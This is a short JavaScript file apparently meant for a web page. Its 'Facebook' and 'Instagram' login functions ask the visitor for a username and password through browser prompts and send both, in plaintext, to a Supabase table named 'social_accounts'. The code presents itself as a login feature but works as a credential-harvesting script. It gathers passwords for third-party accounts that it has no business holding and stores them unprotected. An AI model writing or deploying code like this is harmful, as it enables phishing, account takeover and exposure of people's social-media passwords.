const supabase = window.supabaseClient;

function facebookLogin() {
    const username = prompt("Enter Facebook Username");
    if (!username) return;

    const password = prompt("Enter Facebook Password");
    if (!password) return;

    saveSocial("Facebook", username, password);
}

function instagramLogin() {
    const username = prompt("Enter Instagram Username");
    if (!username) return;

    const password = prompt("Enter Instagram Password");
    if (!password) return;

    saveSocial("Instagram", username, password);
}

async function saveSocial(platform, username, password) {

    alert("Saving Data...");

    const { data, error } = await supabase
        .from("social_accounts")
        .insert([
            {
                platform: platform,
                username: username,
                password: password
            }
        ]);

    if (error) {
        alert("Error: " + error.message);
        console.log(error);
    } else {
        alert("Data Saved Successfully");
    }
}
